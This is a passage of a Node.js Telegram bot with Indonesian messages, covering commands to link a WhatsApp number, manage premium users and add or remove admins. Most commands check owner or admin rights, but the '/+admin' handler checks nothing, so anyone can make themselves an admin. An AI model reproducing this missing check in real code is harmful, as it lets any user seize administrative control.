    await bot.sendMessage(
      chatId,
      `❌ *Kesalahan:* ${
        error.message || "Tidak diketahui"
      }\n_Coba lagi dengan kode Javascript yang valid!_`,
      { parse_mode: "Markdown" }
    );

    // Hapus file jika ada error
    try {
      await fs.promises.access(encryptedPath);
      await fs.promises.unlink(encryptedPath);
    } catch (err) {
      console.error("Gagal menghapus file:", err.message);
    }
  }
});

//=======plugins=======//
bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek akses admin atau owner
  if (!adminUsers.includes(senderId) && !isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan perintah ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, ""); // Ambil hanya angka

  // Validasi nomor bot kosong
  if (!botNumber) {
    return bot.sendMessage(chatId, "❌ Masukkan nomor dengan format benar, contoh: `/connect 628123xxxx`", {
      parse_mode: "Markdown"
    });
  }

  try {
    await connectToWhatsApp(bot, botNumber, chatId); // Tambahkan `bot` sebagai argumen pertama
  } catch (error) {
    console.error("❌ Error in /connect:", error);
    bot.sendMessage(
      chatId,
      "🚫 Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ"
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ ᴛᴏʟᴏɴɢ ᴍᴀsᴜᴋᴋᴀɴ ᴅᴇɴɢᴀɴ ɪᴅ ᴅᴀɴ ᴡᴀᴋᴛᴜ, ᴄᴏɴᴛᴏʜ: /addprem 6614718105 30d"
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ ᴛᴏʟᴏɴɢ ᴍᴀsᴜᴋᴋᴀɴ ᴅᴇɴɢᴀɴ ɪᴅ ᴅᴀɴ ᴡᴀᴋᴛᴜ, ᴄᴏɴᴛᴏʜ: /addprem 6614718105 30d"
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ ɪɴᴠᴀʟɪᴅ ɪᴅ ʜᴀʀᴜs sᴇᴘᴇʀᴛɪ ɪɴɪ /addprem 6614718105 30d"
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ ɪɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ ғᴏʀᴍᴀᴛ! ᴄᴏɴᴛᴏʜ: ᴅ(ᴅᴀʏs), ʜ(ʜᴏᴜʀs), ᴍ(ᴍɪɴᴜᴛᴇs)"
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛᴘʀᴇᴍ"
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ ^_^.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/+admin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ ᴛᴏʟᴏɴɢ ᴍᴀsᴜᴋᴋᴀɴ ɪᴅ ᴄᴏɴᴛᴏʜ: /+admin 6614718105 "
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ, ᴇxᴀᴍᴘʟᴇ: /+admin 6614718105."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna adalah owner atau admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴄᴏᴍᴍᴀɴᴅ ʜᴀᴘᴜs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ"
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ ᴛᴏʟᴏɴɢ ʜᴀᴘᴜs sᴇᴘᴇʀᴛɪ ɪɴɪ /delprem 6614718105"
    );
  }

  const userId = parseInt(match[1]);

  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ ᴜsᴇʀ ɪᴅ ʜᴀʀᴜs ɴᴏᴍᴏʀ!."
    );
  }

  // Cari index user dalam daftar premium
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }

  // Hapus user dari daftar
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `✅ User ${userId} has been removed from the premium list.`
  );
});

bot.onText(/\/-admin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Pengecekan input dari pengguna
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ ᴛᴏʟᴏɴɢ ᴍᴀsᴜᴋᴋᴀɴ sᴇᴘᴇʀᴛɪ ɪɴɪ /-admin 6614718105 "
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. ᴇxᴀᴍᴘʟᴇ: /-admin 6614718105."
    );
  }

  // Cari dan hapus user dari adminUsers
  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
